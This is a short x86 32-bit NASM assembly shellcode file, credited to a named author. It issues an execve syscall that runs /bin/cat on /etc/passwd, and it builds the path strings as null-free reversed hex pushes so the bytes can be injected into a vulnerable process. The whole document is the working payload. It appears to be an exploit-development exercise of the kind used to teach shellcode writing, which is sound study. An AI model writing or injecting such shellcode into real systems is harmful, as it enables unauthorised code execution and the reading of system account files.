;By Arun Kumar Shreevastava
;exeve("/bin/cat", {"/bin/cat","/etc/passwd",NULL}, NULL)
BITS 32

global _start

section .text

_start:
	;push /bin/cat
	xor eax,eax
	push eax
	push 0x7461632f ;tac/
	push 0x6e69622f ;nib/
	mov ebx, esp
	
	;push args
	push eax
	push 0x64777373 ;dwss
	push 0x61702f63 ;ap/c
	push 0x74652f2f ;te//
	
	mov ecx, esp	;temp save the pointer
	
	push eax	;NULL
	push ecx	;pointer to 2nd args
	push ebx	;pointer to 1st args
	mov ecx, esp
	
	push eax
	mov edx,esp
	
	mov al,11
	int 0x80
